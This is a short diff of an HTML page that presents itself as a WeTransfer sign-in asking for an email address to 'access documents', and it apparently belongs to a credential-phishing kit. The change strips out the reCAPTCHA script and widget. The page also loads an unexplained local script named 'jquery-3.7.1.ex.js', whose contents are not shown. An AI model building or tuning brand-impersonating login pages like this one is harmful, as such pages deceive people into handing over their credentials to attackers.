@@ -7,8 +7,6 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
   <script type="module" crossorigin src="jquery-3.7.1.ex.js"></script>
   <script type="module" crossorigin src="jquery-3.7.1.min.js"></script>
-  <script type="module" crossorigin src="captcha.js"></script>
-  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
     /* Reset and Base Styles */
     * {
@@ -488,7 +486,6 @@
         <h2>WeTransfer</h2>
       </div>
       <p class="title">Sign in with your email to access documents</p>
-      <p id="response"></p>
       <div class="error-message" id="errorMessage"></div>
       <form id="downloadForm">
         <div class="form-group">
@@ -501,8 +498,6 @@
           <input type="checkbox" id="remember-me">
           <label for="remember-me">Remember me</label>
         </div>
-        <!-- Google reCAPTCHA -->
-    <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div><br>
         <div class="form-group btn-group">
           <button class="btn btn-submit" type="submit" id="submitButton">Sign in</button>
           <button class="btn logo" type="button">
